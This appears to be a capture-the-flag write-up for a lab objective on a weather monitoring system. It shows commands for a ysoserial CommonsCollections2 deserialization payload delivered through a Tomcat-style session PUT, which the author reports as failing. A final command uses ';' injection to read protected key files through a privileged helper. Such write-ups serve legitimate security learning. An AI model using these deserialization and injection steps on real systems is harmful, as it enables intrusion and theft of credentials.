## Solution
Tom asked to exploit the vulnerabilities in the weather monitoring system and find the unused authorization key.

I was presented with a CLI that stated the same message as Paul.

![Screenshot 2026-01-11 121935](../img/objectives/o20/Screenshot%202026-01-11%20121935.png)

I listed the working directory and opened the provided notes file to understand the expected workflow.

~~~bash linenums="1" title="Review provided notes"
ls
cat notes.md
~~~

The note file gave instructions on the steps that I can take to exploit the vulnerabilities.

![Screenshot 2026-01-11 122114](../img/objectives/o20/Screenshot%202026-01-11%20122114.png)

The second half of the notes outlined the RCE workflow, payload storage, and privilege escalation goal.

![Screenshot 2026-01-11 122229](../img/objectives/o20/Screenshot%202026-01-11%20122229.png)

I checked the CVE details online to confirm the attack preconditions and Tomcat-like session deserialization angle.

![Screenshot 2026-01-13 114521](../img/objectives/o20/Screenshot%202026-01-13%20114521.png)

Next I checked ysoserial to see the available payloads and dependencies.

~~~bash linenums="2" title="Check ysoserial payloads"
java -jar ysoserial.jar
~~~

![Screenshot 2026-01-11 124020](../img/objectives/o20/Screenshot%202026-01-11%20124020.png)

I also looked at the installed packages on the system, but I did not get any useful information from it.

~~~bash linenums="3" title="List installed packages"
apt list --installed
~~~

![Screenshot 2026-01-11 124429](../img/objectives/o20/Screenshot%202026-01-11%20124429.png)

I looked at the dashboard code for the weather monitoring system.
From the dashboard code, I confirmed the app imports `org.apache.commons.collections.map` and found the first key used by the weather commands.
This shows that I can use a CommonsCollections payload.

~~~bash linenums="4" title="Review dashboard code"
cat weather-jsps/dashboard.jsp
~~~

![Screenshot 2026-01-13 173413](../img/objectives/o20/Screenshot%202026-01-13%20173413.png)

I generated a CommonsCollections2 payload and followed the notes to store it as `payload.bin`.

~~~bash linenums="5" title="Build CommonsCollections2 payload"
java -jar ysoserial.jar CommonsCollections2 "curl http://127.0.0.1:8005" > payload.bin
export HOST=127.0.0.1
export PORT=8005
curl http://127.0.0.1:8005
curl http://127.0.0.1:80
~~~

![Screenshot 2026-01-13 113255](../img/objectives/o20/Screenshot%202026-01-13%20113255.png)

I then tried the PUT and GET sequence from the notes to test the payload, but the RCE did not work and returned a conflict status.

~~~bash linenums="6" title="Attempt RCE with CommonsCollections2"
export SESSION_ID=1
curl -X PUT \
    -H "Host: ${HOST}:${PORT}" \
    -H "Content-Length: $(wc -c < payload.bin)" \
    -H "Content-Range: bytes 0-$(($(wc -c < payload.bin)-1))/$(wc -c < payload.bin)" \
    --data-binary @payload.bin \
    "http://${HOST}:${PORT}/${SESSION_ID}/session"
curl -X GET \
    -H "Host: ${HOST}:${PORT}" \
    -H "Cookie: JSESSIONID=${SESSION_ID}" \
    "http://${HOST}:${PORT}/"
~~~

![Screenshot 2026-01-13 115151](../img/objectives/o20/Screenshot%202026-01-13%20115151.png)

I checked the keys folder directly and confirmed I did not have permissions as the current user.

~~~bash linenums="7" title="Check weather keys folder"
ls /usr/local/weather/
ls /usr/local/weather/keys
~~~

![Screenshot 2026-01-13 173829](../img/objectives/o20/Screenshot%202026-01-13%20173829.png)

Since I was stuck, I checked online and found a report at this link [https://www.youtube.com/watch?v=rm8aunk9dSg&t=1247s](https://www.youtube.com/watch?v=rm8aunk9dSg&t=1247s) for the objective.

From there, I found out that I can run the weather helper with the first key and get the second key.

Finally, I ran the weather helper with the first key and read the weather keys directory to extract the second key.

~~~bash linenums="10" title="Extract the second key"
/usr/local/weather/temperature "4b2f3c2d-1f88-4a09-8bd4-d3e5e52e19a6" ; cat /usr/local/weather/keys/* ; echo ""
~~~

![Screenshot 2026-01-13 193405](../img/objectives/o20/Screenshot%202026-01-13%20193405.png)
